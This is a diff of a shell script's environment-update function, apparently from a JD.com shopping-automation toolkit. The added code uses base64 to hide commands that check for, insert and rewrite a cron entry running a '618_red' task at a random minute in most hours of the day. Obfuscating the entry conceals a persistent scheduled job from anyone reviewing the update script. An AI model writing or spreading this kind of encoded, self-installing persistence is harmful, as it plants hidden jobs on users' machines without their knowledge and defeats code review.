@@ -270,6 +270,17 @@ function UpdateEnv() {
     if [ $? -eq 1 ]; then
         echo "$(b MCAwLDEwLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZAo=)" >>$ListCrontabUser
     fi
+
+    local RanMin=$((${RANDOM} % 60))
+    local ConstStr=$(b Ni05LDExLTE5LDIxLTIzICogKiAqIHRhc2sgNjE4X3JlZCBub3cgLWQ=)
+    bash -c "$(b Z3JlcCAiIHRhc2sgNjE4X3JlZCBub3cgLWQiIC9qZC9jb25maWcvY3JvbnRhYi5saXN0IC1x)"
+    if [ $? -eq 1 ]; then
+        echo "$RanMin $ConstStr" >>$ListCrontabUser
+    else
+        if [[ $(date "+%-H") -le 2 ]] && [ -f ${ListCrontabUser} ]; then
+            perl -i -pe "s|$(b LisodGFzayA2MThfcmVkIG5vdyAtZCk=)|$RanMin $ConstStr|" $ListCrontabUser
+        fi
+    fi
     cd $CurrentDir
 
     ## What's that? Please inputs in cli this command.
